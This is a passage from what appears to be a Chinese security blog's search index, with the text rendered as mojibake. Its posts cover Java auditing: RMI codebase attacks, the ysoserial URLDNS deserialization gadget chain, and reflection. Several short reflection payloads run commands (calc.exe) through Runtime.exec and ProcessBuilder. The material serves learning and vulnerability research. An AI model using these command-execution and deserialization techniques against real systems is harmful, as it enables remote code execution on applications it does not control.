{Map.class},handler);","link":"/2022/04/15/java%E5%AE%A1%E8%AE%A1-lazymap/"},{"title":"javaå®¡è®¡-rmiåè®®","text":"RMIRMIæ˜¯Remote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚æ˜¯è®©javaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªjavaè™šæ‹Ÿæœºä¸­å¯¹è±¡ä¸Šçš„æ–¹æ³•ã€‚ RMI Server:package org.vulhub.RMI;import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RMIServer { //ç»§æ‰¿äº†java.rmi.Remoteæ¥å£ï¼Œå…¶ä¸­å®šä¹‰æˆ‘ä»¬è¦è¿œç¨‹è°ƒç”¨çš„å‡½æ•°hello public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } //å®ç°æ­¤æ¥å£çš„ç±» public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } public String hello() throws RemoteException{ System.out.println(&quot;call from&quot;); return &quot;hello world&quot;; } } //ä¸»ç±»ï¼Œç”¨æ¥åˆ›å»ºRegistry,å¹¶å°†ä¸Šé¢çš„ç±»å®ä¾‹åŒ–åç»‘å®šåˆ°ä¸€ä¸ªç½‘å€ private void start() throws Exception{ RemoteHelloWorld h=new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;,h); } public static void main(String[] args) throws Exception{ new RMIServer().start(); }} åˆ†æ: LocateRegistry.createRegistry(1099);Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;,new RemoteHelloWorld()); ç¬¬ä¸€è¡Œåˆ›å»ºå¹¶è¿è¡ŒRMI Registryï¼Œç¬¬äºŒè¡Œå°†Rexxxå¯¹è±¡ç»‘å®šåˆ°Helloè¿™ä¸ªåå­—ä¸Šã€‚ Naming.bindçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªURLï¼Œå½¢å¦‚:rmi://host:port/nameã€‚å…¶ä¸­ï¼Œhostå’Œportå°±æ˜¯RMI Registryçš„åœ°å€å’Œç«¯å£ï¼Œnameæ˜¯è¿œç¨‹å¯¹è±¡çš„åå­—ã€‚ å¦‚æœRMI Registryåœ¨æœ¬åœ°è¿è¡Œï¼Œåˆ™hostå’Œportå¯ä»¥çœç•¥ï¼Œé»˜è®¤ä¸º1099 RMI client:package org.vulhub.Train;import org.vulhub.RMI.RMIServer;import java.rmi.Naming;public class TrainMain { public static void main(String[] args) throws Exception{ RMIServer.IRemoteHelloWorld hello=(RMIServer.IRemoteHelloWorld) Naming.lookup(&quot;rmi://127.0.0.1:1099/Heelo&quot;); String ret= hello.hello(); System.out.println(ret); }} é€šä¿¡åˆ†ææ•´ä¸ªé€šä¿¡è¿‡ç¨‹è¿›è¡Œäº†ä¸¤æ¬¡TCPæ¡æ‰‹ï¼Œå»ºç«‹äº†ä¸¤æ¬¡TCPè¿æ¥ï¼Œé¦–å…ˆå®¢æˆ·ç«¯è¿æ¥Registry,å¹¶åœ¨å…¶ä¸­å¯»æ‰¾Nameæ˜¯Helloçš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹åº”æ•°æ®æµä¸­çš„Callæ¶ˆæ¯ï¼Œç„¶åRegistryè¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ï¼Œè¿™ä¸ªå°±æ˜¯æ‰¾åˆ°çš„Name=Helloçš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹åº”æ•°æ®æµä¸­çš„ReturnDataæ¶ˆæ¯ï¼›å®¢æˆ·ç«¯ååºåˆ—åŒ–è¯¥å¯¹è±¡ï¼Œå‘ç°è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ RMI Registryå°±åƒâ¼€ä¸ªâ½¹å…³ï¼Œä»–â¾ƒâ¼°æ˜¯ä¸ä¼šæ‰§â¾è¿œç¨‹â½…æ³•çš„ï¼Œä½†RMI Serverå¯ä»¥åœ¨ä¸Šâ¾¯æ³¨å†Œâ¼€ä¸ªNameåˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼›RMI Clienté€šè¿‡Nameå‘RMI RegistryæŸ¥è¯¢ï¼Œå¾—åˆ°è¿™ä¸ªç»‘å®šå…³ç³»ï¼Œç„¶åå†è¿æ¥RMIServerï¼›æœ€åï¼Œè¿œç¨‹â½…æ³•å®é™…ä¸Šåœ¨RMI Serverä¸Šè°ƒâ½¤ã€‚ å®‰å…¨é—®é¢˜1.list+lookupè¿œç¨‹è°ƒç”¨listæ–¹æ³•å¯ä»¥åˆ—å‡ºç›®æ ‡ä¸Šæ‰€æœ‰ç»‘å®šçš„å¯¹è±¡: String[] s= Naming.list(&quot;rmi://xxx&quot;); è€Œlookupä½œç”¨å°±æ˜¯è·å¾—æŸä¸ªè¿œç¨‹å¯¹è±¡ï¼Œè‹¥å­˜åœ¨å±é™©æ–¹æ³•ï¼Œåˆ™å¯è¿›è¡Œè°ƒç”¨ 2.RMIåˆ©ç”¨codebaseæ‰§è¡Œä»»æ„ä»£ç codebase:æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºæˆ‘ä»¬åº”è¯¥ä»å“ªä¸ªåœ°æ–¹å»æœç´¢ç±»ï¼Œé€šå¸¸æ˜¯è¿œç¨‹URLã€æ¯”å¦‚httpã€ftpç­‰ã€‚ å¦‚æœæˆ‘ä»¬æŒ‡å®šcodebase=http://exampl.com/,ç„¶ååŠ è½½org.vulhub.example.Exampleç±»ï¼Œåˆ™javaè™šæ‹Ÿæœºä¼šä¸‹è½½è¿™ä¸ªæ–‡ä»¶http://example.com/org/vulhub/example/Example.class ï¼Œå¹¶ä½œä¸ºExampleç±»çš„å­—èŠ‚ç ã€‚ RMIæµç¨‹ä¸­ï¼Œååºåˆ—åŒ–æ—¶å‘ç°ä¸€ä¸ªå¯¹è±¡ï¼Œå…ˆä¼šåœ¨CLASSPAATHä¸‹å¯»æ‰¾ï¼Œè‹¥æ²¡æ‰¾åˆ°ï¼Œåˆ™ä¼šè¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»ã€‚ æ”»å‡»æ¡ä»¶ codebaseå¯æ§ å®‰è£…å¹¶é…ç½®äº†SecurityManager Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº†java.rmi.server.useCodebaseOnly=falseå…¶ä¸­java.rmi.server.useCodebaseOnlyæ˜¯åœ¨Java 7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼š https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html PSï¼šå½“java.rmi.server.useCodebaseOnlyä¸ºtrueæ—¶ï¼Œjavaè™šæ‹Ÿæœºå°†åªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebaseã€‚ classAnnotationså¯ä»¥ä½¿ç”¨SerializationDumperæŸ¥çœ‹æ•°æ®åŒ…ä¸­çš„javaååºåˆ—åŒ–å†…å®¹ é€šè¿‡ä¿®æ”¹classAnnotationså¯ä»¥æ§åˆ¶codebaseã€‚","link":"/2022/03/30/java%E5%AE%A1%E8%AE%A1-rmi%E7%AF%87/"},{"title":"javaå®¡è®¡(ä¸‰)","text":"å•ä¾‹æ¨¡å¼ä¸‹å¦‚ä½•é€šè¿‡åå°„å®ç°å‘½ä»¤æ‰§è¡ŒgetMehtodå’Œinvokeæ–¹æ³•getMethodçš„ä½œç”¨æ˜¯é€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ï¼Œjavaä¸­æ”¯æŒç±»çš„é‡è½½ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…é€šè¿‡å‡½æ•°åæ¥ç¡®å®šä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨getMethodçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥éœ€è¦è·å–çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ ä¾‹å­: getMethod(&quot;exec&quot;,String.class) invokeçš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š1.å¦‚æœæ˜¯æ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡2.å¦‚æœæ˜¯é™æ€æ–¹æ³•ï¼Œåˆ™ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» payload: Class clazz= Class.forName(&quot;java.lang.runtime&quot;); clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exec&quot;); å°†ä¸Šè¿°paylaodåˆ†è§£å®Œä»¥åå¯å¾— Class clazz=Class.forName(&quot;java.lang.runtime&quot;);Method execMethod=clazz.getMethod(&quot;exec&quot;,String.class);Method getRuntimeMethod=clazz.getMethod(&quot;getRuntime&quot;);Object runtime =getRuntimeMethod.invoke(clazz);execMethod.invoke(runtime,&quot;calc.exec&quot;); getConstructor1.getConstructoræ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œ2.è·å–åˆ°æ„é€ å‡½æ•°åï¼Œä½¿ç”¨newInstanceæ¥æ‰§è¡Œ eg:ä½¿ç”¨åå°„è·å–ProcessBuilderçš„æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨start()æ¥æ‰§è¡Œå‘½ä»¤ Class clazz=Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cacl.exe&quot;))).start(); ProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š 1.public ProcessBuilder(List&lt;string&gt; command)2.public ProcessBuilder(String... command) ä½†æ˜¯ç¬¬ä¸€ä¸ªå½¢å¼ä½¿ç”¨äº†å¼ºåˆ¶ç±»å‹è½¬åŒ–ï¼ˆåŒºåˆ«çœ‹ä¸‹é¢ï¼‰ ä½†æ˜¯åœ¨è¡¨è¾¾å¼ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰æ­¤è¯­æ³•ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨åå°„ Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))); é€šè¿‡getMethod(â€œstartâ€)è·å–åˆ°startæ–¹æ³•ï¼Œç„¶åinvokeæ‰§è¡Œï¼Œinvokeçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ProcessBuilder Objectã€‚ å¯¹æ¯”ä¸€ä¸‹ä¸¤è€…çš„åŒºåˆ«ï¼Œå‰è€…æ˜¯å¼ºåˆ¶è½¬åŒ–ä¸ºå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œåè€…æ˜¯é€šè¿‡åå°„è°ƒç”¨ç±»å’Œæ–¹æ³•æ¥æ‰§è¡Œã€‚ å¯å˜é•¿å‚æ•°å¯å˜é•¿å‚æ•°ï¼Œjavaåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ public void hello(String[] names){}public void hello(String...names){} ç”¨æ³•å¯¹äºåå°„è€Œè¨€ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯è¾¹é•¿å‚æ•°ï¼Œåˆ™åªéœ€å°†å…¶ä½œä¸ºæ•°ç»„å³å¯ã€‚ å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±»String[].classä¼ ç»™getConstructor,è·å–ProcessBuilderçš„ç¬¬äºŒç§æ„é€ å‡½æ•°ï¼š Class clazz=class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getConstructor(String[].class) åœ¨è°ƒç”¨newInstanceçš„æ—¶å€™ï¼Œæ¥å—çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™ProcessBuilderçš„ä¹Ÿæ˜¯ï¼ŒäºŒè€…å åŠ å˜æˆäºŒç»´æ•°ç»„payload: Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})).start(); ç§æœ‰æ–¹æ³•è¿›è¡Œåå°„getDeclared:1.getMethodç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­çš„æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•2.getDeclaredMethodç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­å£°æ˜çš„æ–¹æ³•ï¼Œæ˜¯å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»å“ªé‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº† å·®å¼‚ï¼šå¤§æ¦‚å°±æ˜¯getDeclaredMethodå¯ä»¥ç›´æ¥è·å¾—åˆ°ç±»çš„ç§æœ‰å¯¹è±¡å¹¶ä¸”å¯ä»¥å®ä¾‹åŒ– Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})).start(); è€ŒsetAccessibleä½œç”¨åœ¨äºä¿®æ”¹ä½œç”¨åŸŸï¼Œå¦åˆ™æ— æ³•è°ƒç”¨ å°ç»“çœ‹äº†è¿™ä¹ˆå¤šï¼Œå¤§æ¦‚æ€»ç»“ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯åŒºåˆ†ä¸åŒæƒ…å†µå¦‚ä½•å®ç°å‘½ä»¤æ‰§è¡Œï¼Œå•åˆ©æ¨¡å¼ï¼Œç§æœ‰æ–¹æ³•ï¼Œä½¿ç”¨getMethodæˆ–è€…ä½¿ç”¨getConstructorï¼Œæˆ–è€…æ˜¯getDeclaredæ¥è°ƒç”¨å…¶æ–¹æ³•ï¼Œç„¶ååœ¨è¿™ä¹‹å‰éœ€è¦ç”¨fornameï¼Œæˆ–è€…æ˜¯å…¶ä»–æ–¹æ³•æ¥è·å–åˆ°è¿™ä¸ªå¯¹è±¡ï¼Œæ‰å¯è°ƒç”¨å…¶æ–¹æ³•","link":"/2022/03/17/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"},{"title":"java_URLDNS","text":"readObject/writeObjectjavaåœ¨åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°†ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸­çš„writeobjectæ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯objectOutputStreamï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ªstreamä¸­ï¼Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨readObjectï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥ä»ä¸­è¯»å–å‡ºå‰é¢å†™å…¥çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ç† ysoserial-URLDNSgadget chainsï¼šåˆ©ç”¨é“¾ URLDNSæ˜¯ysoserialä¸­ä¸€ä¸ªåˆ©ç”¨é“¾çš„åå­—ï¼Œå…¶ç»“æœæ˜¯ä¸€æ¬¡DNSè¯·æ±‚ ä½œç”¨ ä½¿ç”¨javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ– åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ åˆ©ç”¨é“¾åˆ†æè§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•æ˜¯readObjectï¼Œä¸ºäº†ç ”ç©¶ysoserialä¸­çš„è¿™ä¸ªåˆ©ç”¨é“¾ï¼Œæˆ‘ä»¬ä»payloadå…¥æ‰‹ï¼Œå…¶ä¸­å†™åˆ° public class URLDNS implements ObjectPayload&lt;Object&gt;{ public Object getObject(final String url) throws Exception{ ...... HashMap ht = new HashMap(); }} å¯ä»¥å‘ç°ï¼Œåœ¨getObjectä¸­è¿”å›çš„è¢«ååºåˆ—åŒ–çš„å¯¹è±¡æ˜¯HashMapï¼Œå› æ­¤æ¥ä¸‹æ¥å°±æ˜¯åœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼Œè·Ÿä¸€ä¸‹å…¶è¿‡ç¨‹ å¦‚ä½•ä½¿ç”¨ysoserialé¡¹ç›®è¿›è¡Œè°ƒè¯•æ‰“å¼€å·¥ç¨‹ï¼Œç„¶åé’ˆå¯¹ç¼ºå°‘çš„ä¾èµ–ï¼Œå¯ä»¥ç›´æ¥ç‚¹å‡»+å·è¿›è¡Œæ·»åŠ  æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹pom.xmlå¯ä»¥å‘ç°ä¸»ç±»æ˜¯ ysoserial.GeneratePayload æ¥ä¸‹æ¥åˆ°è¿™ä¸ªä¸»ç±»è¿™é‡Œè¿›è¡Œåˆ†æï¼Œç„¶åå³é”®ç‚¹å‡»å¼€å§‹debugï¼Œåœ¨ä¸Šé¢è®¾ç½®ä¸€ä¸‹å‚æ•° å¯ä»¥å‘ç°å·²ç»è·‘èµ·æ¥äº†ï¼Œå¹¶ä¸”åœ¨æ–­ç‚¹è¿™é‡Œåœä¸‹äº† åˆ†æURLDNSçš„getObjectä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œæ‰€ä»¥æ¥è¿™é‡Œè¿›è¡Œåˆ†æï¼Œå‘ç°å…¶è°ƒç”¨äº†HasMap()ï¼Œå¹¶ä¸”è¿™è¾¹æ³¨é‡Šåˆ°ä¼šé“¾æ¥åˆ°URL åœ¨hashmapå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹çœ‹ååºåˆ—åŒ–æ–¹æ³•readObject(),è€Œå…¶ä¸­æ¯”è¾ƒç‰¹æ®Šçš„ç‚¹å°±åœ¨è¿™é‡Œï¼Œåœ¨å‰é¢æ‰€è¯´ The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). å› æ­¤æˆ‘ä»¬ç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•° å¯ä»¥å‘ç°ï¼Œåœ¨hashå‡½æ•°è°ƒç”¨äº†hashcodeçš„æ–¹æ³•ï¼Œå¹¶ä¸”æ­¤æ—¶ä¼ å…¥æˆ‘ä»¬ä¸€å¼€å§‹è®¾å®šçš„url å†å¾€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™é‡Œçš„handleræ˜¯æŒ‡å‘ä¸€ä¸ªurlç±»çš„ï¼ˆä¸€å¼€å§‹æˆ‘åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯åˆå§‹åŒ–debugçš„æ—¶å€™ï¼Œä¹Ÿä¼šç»è¿‡è¿™é‡Œï¼Œè€Œé‚£ä¸ªåªæ˜¯åœ¨å¯»æ‰¾jaråŒ…ï¼Œæ‰€ä»¥è¿™é‡Œçš„keyçš„å±æ€§å°±ä¸åŒäº†ï¼Œå¯¼è‡´åé¢çš„handleræŒ‡å‘çš„å‡½æ•°ä¹Ÿä¸åŒï¼Œæœ‰å¾ˆå¤šåŒåå‡½æ•°ï¼‰ è€Œæ­¤æ—¶çš„handlerå°±ä¼šæŒ‡å‘URLStreamHandlerçš„hashCodeæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªhashcodeæ–¹æ³•ä¸­å¯ä»¥å‘ç°è°ƒç”¨äº†getHostAddress ç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°è°ƒç”¨äº†getByName InetAddress.getByName(host) çš„ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡DNSæŸ¥è¯¢ã€‚ æ€»ç»“è¿™æ¬¡çš„Gadgetæµç¨‹å¦‚ä¸‹:1.HashMap-&gt;readObject()2.HashMap-&gt;hash()3.URL-&gt;hashCode()4.URLStreamHandler-&gt;hashCode()5.URLStreamHandler-&gt;getHostAddress()6.InetAddress-&gt;getByName() pocçŸ¥é“æ•´æ¡åˆ©ç”¨é“¾ä»¥åï¼Œå°±è¦å­¦ä¹ ä¸€ä¸‹å¦‚ä½•ç¼–å†™ååºåˆ—åŒ–expäº†ï¼Œåé¢å†æ¥è¡¥å‘","link":"/2022/04/04/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"javaåå°„æœºåˆ¶","text":"å¦‚ä½•ç†è§£åå°„åå°„å¯ä»¥ç†è§£ä¸ºä¸€ç§æ‰‹æ®µï¼Œå¯¹è±¡é€šè¿‡åå°„å¯ä»¥è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„æ‰€æœ‰æ–¹æ³•ï¼Œé€šè¿‡åå°„ï¼Œæˆ‘ä»¬å¯ä»¥å°†javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚ è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„åŠŸèƒ½æˆä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ å¦‚ä½•ç†è§£åŠ¨æ€ç‰¹æ€§â¼€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§â½£åŠŸèƒ½æ€§çš„å˜åŒ– è·å–ç±»å¯¹è±¡çš„æ–¹æ³•1.forname()æ–¹æ³•é€šè¿‡åŠ¨æ€ä¿®æ”¹fornameçš„å‚æ•°ï¼Œå¯ä»¥è·å–ä¸åŒçš„javaç±» å¹¶ä¸”å…¶é™æ€æ–¹æ³•JVMä¼šè£…åœ¨ç±»ï¼Œå¹¶ä¸”æ‰§è¡Œstatic()ä¸­çš„ä»£ç ã€‚ public class reflect_test { public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;xxxx&quot;); System.out.println(name); }} 2.ç›´æ¥è·å–ä»»ä½•æ•°æ®ç±»å‹éƒ½å…·å¤‡é™æ€çš„å±æ€§ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨.classç›´æ¥è·å–å…¶å¯¹åº”çš„classå¯¹è±¡,éœ€è¦æ˜ç¡®ç”¨åˆ°ç±»ä¸­çš„é™æ€æˆå‘˜ public static void main(String[] args) throws ClassNotFoundException{ Class&lt;?&gt; name=Runtime.class; System.out.println(name);} 3.ä½¿ç”¨getclass()æ–¹æ³•æˆ‘ä»¬å¯ä»¥é€šè¿‡objectç±»ä¸­çš„getclass()æ–¹æ³•æ¥è·å–å­—èŠ‚ç å¯¹è±¡éœ€è¦æ˜ç¡®å…·ä½“çš„ç±»ï¼Œç„¶ååˆ›å»ºå¯¹è±¡ public static void main(String[] args) throws ClassNotFoundException{ Runtime rt= Runtime.getRuntime(); Class&lt;?&gt; name=rt.getClass(); System.out.println(name);} 4.ä½¿ç”¨getSystemClassLoader().loadClass()1.ç±»ä¼¼äºforName() ä½†æ˜¯ä¸ä¼šæ‰§è¡Œstaticä¸­çš„ä»£ç ã€‚ public static void main(String[] args) throws ClassNotFoundException{ Class&lt;?&gt; name=ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;); System.out.println(name);} è·å–ç±»çš„æ–¹æ³•1.getDeclaredMethodsæ–¹æ³•getDeclaredMethodsæ–¹æ³• è¿”å›ç±»æˆ–æ¥å£å£°æ˜çš„æ‰€æœ‰åŠæ³•ï¼ŒåŒ…æ‹¬publicã€protectedã€privateã€å’Œé»˜è®¤æ–¹æ³•ï¼Œä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³• import java.lang.reflect.Method;public class getfunction { public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;java.lang.Runtime&quot;); Method[] declaredMethods=name.getDeclaredMethods(); System.out.println(&quot;é€šè¿‡getDeclaredMethodsè·å–çš„æ–¹æ³•æœ‰:&quot;); for(Method m:declaredMethods) System.out.println(m); } 2.getMethodsæ–¹æ³•getMethodsæ–¹æ³•è¿”å›æŸä¸ªç±»çš„æ‰€æœ‰publicæ–¹æ³•ï¼ŒåŒ…æ‹¬å…¶ç»§æ‰¿ç±»çš„publicæ–¹æ³• public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;java.lang.Runtime&quot;); Method[] declaredMethods=name.getMethods(); System.out.println(&quot;é€šè¿‡getMethodsè·å–çš„æ–¹æ³•æœ‰:&quot;); for(Method m:declaredMethods) System.out.println(m);} 3.getMethodæ–¹æ³•åªèƒ½è¿”å›ä¸€ä¸ªç‰¹å®šçš„æ–¹æ³•ï¼Œå¦‚Runtimeç±»ä¸­çš„execæ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åç§°ï¼Œåé¢çš„å‚æ•°ä¸ºæ–¹æ³•çš„å‚æ•°å¯¹åº”classçš„å¯¹è±¡ public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException{ Runtime rt=Runtime.getRuntime(); Class&lt;?&gt; name= rt.getClass(); Method method=name.getMethod(&quot;exec&quot;,String.class); System.out.println(&quot;é€šè¿‡getMethodsè·å–çš„æ–¹æ³•æœ‰:&quot;); System.out.println(method);} 4.getDeclaredMethodæ–¹æ³•getDeclaredMethodæ–¹æ³•å’ŒgetMethodç±»ä¼¼ è·å–æˆå‘˜å˜é‡1.getDeclaredFieldsæ–¹æ³•getDeclaredFieldsèƒ½è·å¾—ç±»çš„æˆå‘˜å˜é‡æ•°ç»„ï¼ŒåŒ…æ‹¬publicã€privateã€protectedï¼Œä½†æ˜¯ä¸åŒ…æ‹¬çˆ¶ç±»çš„å£°æ˜å­—æ®µ 2.getFieldsæ–¹æ³•getFieldsèƒ½å¤Ÿè·å¾—æŸä¸ªç±»çš„æ‰€æœ‰publicå­—æ®µï¼ŒåŒ…æ‹¬çˆ¶ç±»ä¸­çš„å­—æ®µï¼Œ 3.getDeclaredFieldæ–¹æ³•åªèƒ½è·å¾—ç±»çš„å•ä¸ªæˆå‘˜å˜é‡ 4.getFieldæ–¹æ³•ç±»ä¼¼getFieldsæ–¹æ³•ï¼Œèƒ½å¤Ÿè·å¾—æŸä¸ªç±»ç‰¹å®šçš„publicå­—æ®µï¼ŒåŒ…æ‹¬çˆ¶ç±»ä¸­çš„å­—æ®µ Class&lt;?&gt; name=student.getClass()Field getField=name.getField(&quot;content&quot;); å°ç»“forNameä¸æ˜¯è·å–â€œç±»â€çš„å”¯â¼€é€”å¾„ï¼Œé€šå¸¸æ¥è¯´æˆ‘ä»¬æœ‰å¦‚ä¸‹ä¸‰ç§â½…å¼è·å–â¼€ä¸ªâ€œç±»â€ï¼Œä¹Ÿå°±æ˜¯java.lang.Classå¯¹è±¡ï¼š obj.getClass() å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹objï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡obj.getClass()æ¥è·å–å®ƒçš„ç±»Test.class å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„java.lang.Classå¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„classå±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚Class.forName å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤forNameæ¥è·å–","link":"/2022/02/21/java%E5%AE%A1%E8%AE%A13/"},{"title":"javaå­—èŠ‚ç ","text":"##å­—èŠ‚ç èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨jvmä¸­åŠ è½½çš„å­—èŠ‚åºåˆ—##åˆ©ç”¨URLClassLoaderåŠ 